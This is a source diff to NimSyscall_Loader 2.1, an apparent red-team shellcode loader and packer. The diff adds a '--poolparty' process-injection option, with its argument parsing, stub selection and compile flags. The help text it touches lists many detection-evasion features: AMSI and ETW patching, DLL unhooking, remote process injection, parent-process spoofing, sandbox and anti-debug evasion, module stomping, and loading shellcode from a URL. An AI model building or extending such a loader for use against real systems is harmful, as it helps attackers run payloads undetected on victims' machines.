@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -197,6 +197,7 @@ Options:
   --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
       --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
+  --poolparty number    Use Poolparty technique 1,2,3,4 for execution
   --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
   --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
       --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
@@ -365,6 +366,8 @@ var
     stombFunc2: string = "MemProtectHeapUnprotectCurrentThread"
     restore: bool = false
     noAntiEmulate: bool = false
+    poolparty: int = 1
+    usepoolparty: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
 
@@ -787,6 +790,13 @@ if args["--threadlessDll"]:
 if args["--threadlessFunc"]:
     let threadlessFuncarg = args["--threadlessFunc"]
     threadlessFunc = fmt"{threadlessFuncarg}"
+
+# parse number as int
+if args["--poolparty"]:
+    usepoolparty = true
+    let poolpartyarg = args["--poolparty"]
+    poolparty = parse_int($poolpartyarg)
+    suspended = false
 
 if args["--Caro-Kann"]:
     carokann = true
@@ -3562,6 +3572,9 @@ if(macPayload):
     stub.add(macPayloadStub)
 stub.add(Cryptstub15)
 
+if (usepoolparty):
+    stub.add(PoolpartyTypeDefs)
+
 if (not noDInvoke):
     stub.add(DInvokeStubfirst)
     stub.add(DInvokeGetPEB)
@@ -3760,6 +3773,11 @@ if(dripallocate):
 if (selfdelete):
     stub.add(FileDeleteStub)
 stub.add(getRandStub())
+
+# if poolparty add PoolpartyExecute
+if (usepoolparty):
+    stub.add(PoolpartyExecute)
+
 if (localinject):
     if(AMSI):
         stub.add(AMSIStub)
@@ -4140,6 +4158,10 @@ if(unhook):
 
 if(threadless):
     basicCompileFlags.add("-d:threadless ")
+
+if(usepoolparty):
+    basicCompileFlags.add("-d:poolparty ")
+    basicCompileFlags.add(fmt"-d:variant{poolparty} ")
 
 if(dllProxy):
     when system.hostOS == "windows":
